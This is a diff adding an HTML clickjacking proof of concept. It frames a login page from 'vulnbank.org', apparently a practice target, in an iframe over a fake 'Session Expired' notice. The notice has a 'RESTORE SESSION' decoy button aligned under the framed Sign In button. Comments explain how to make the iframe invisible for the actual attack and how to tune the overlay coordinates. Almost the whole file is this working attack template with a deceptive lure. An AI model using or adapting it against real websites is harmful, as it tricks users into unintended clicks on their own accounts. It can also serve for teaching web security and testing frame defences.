@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Session Restore - Action Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* 1. The Container: Keeps the Trap and Bait aligned */
+        .attack-container {
+            position: relative;
+            width: 500px;  /* Typical width of a login form */
+            height: 400px;
+        }
+
+        /* 2. The Trap: The Vulnerable Page (Real Website) */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 500px;
+            height: 400px;
+            
+            /* CRITICAL: This puts the iframe ON TOP of the button */
+            z-index: 2; 
+            
+            /* Make it INVISIBLE so the user sees the decoy below it */
+            /* Change to 0.5 to see how they overlap, 0.0 for the actual attack */
+            opacity: 0.5; 
+            border: 1px solid red; /* Border added just so you can see the iframe edge */
+        }
+
+        /* 3. The Bait: What the user *thinks* they are seeing */
+        .decoy-box {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            padding-top: 50px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            z-index: 1; /* Sits BELOW the iframe */
+        }
+
+        .decoy-button {
+            /* COORDINATE MAPPING:
+               You must adjust 'top' and 'left' pixels until this button 
+               sits EXACTLY underneath the 'Sign In' button of the iframe.
+            */
+            position: absolute;
+            top: 329px; 
+            left: 100px; 
+            
+            width: 300px;
+            height: 50px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        
+        .decoy-button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="attack-container">
+        <iframe src="http://vulnbank.org/login" scrolling="no"></iframe>
+
+        <div class="decoy-box">
+            <h2 style="color: #333;">Session Expired</h2>
+            <p style="color: #666;">Your session has timed out due to inactivity.</p>
+            <p>Please click below to restore your connection.</p>
+            
+            <button class="decoy-button">RESTORE SESSION</button>
+        </div>
+    </div>
+
+</body>
+</html>
